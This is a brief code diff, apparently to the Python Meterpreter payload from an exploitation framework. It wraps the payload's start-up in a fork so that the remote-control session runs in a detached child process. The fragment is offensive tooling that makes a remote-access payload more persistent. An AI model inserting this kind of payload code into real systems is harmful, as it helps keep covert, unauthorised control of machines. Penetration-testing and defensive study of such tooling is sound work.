@@ -403,5 +403,6 @@ class PythonMeterpreter(object):
 		resp = struct.pack('>I', len(resp) + 4) + resp
 		return resp
 
-met = PythonMeterpreter(s)
-met.run()
+if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+	met = PythonMeterpreter(s)
+	met.run()
